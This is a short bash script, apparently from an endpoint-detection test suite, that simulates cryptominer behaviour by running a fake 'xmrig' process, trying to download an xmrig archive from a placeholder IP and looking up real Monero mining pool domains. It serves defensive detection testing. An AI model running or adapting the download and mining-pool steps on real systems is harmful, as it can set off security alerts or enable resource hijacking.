#!/bin/bash
# 19 - Cryptominer Simulation (best-effort)
# Trigger: May require ML/IOA policy tuning
# Tactic: Impact / Resource Hijacking
set -e
echo "=== [19] Cryptominer Simulation (best-effort) ==="

# Create a fake xmrig process
cat > /tmp/xmrig << 'EOF'
#!/bin/bash
# Fake cryptominer process for detection testing
echo "[*] XMRig v6.21.0 (simulated)"
echo "[*] Pool: stratum+tcp://pool.minexmr.com:4444"
echo "[*] Mining XMR..."
sleep 5
EOF
chmod +x /tmp/xmrig
/tmp/xmrig 2>/dev/null || true

# Attempt to download xmrig (will fail but triggers network IOA)
curl -s --connect-timeout 3 -o /dev/null \
  "http://192.0.2.1/xmrig-6.21.0-linux-static-x64.tar.gz" 2>/dev/null || true

# Simulate mining pool DNS lookup
dig +short pool.minexmr.com 2>/dev/null || nslookup pool.minexmr.com 2>/dev/null || true
dig +short xmr.2miners.com 2>/dev/null || true

# Cleanup
rm -f /tmp/xmrig 2>/dev/null || true

echo "[19] Done — Cryptominer (best-effort, may not trigger detection)"
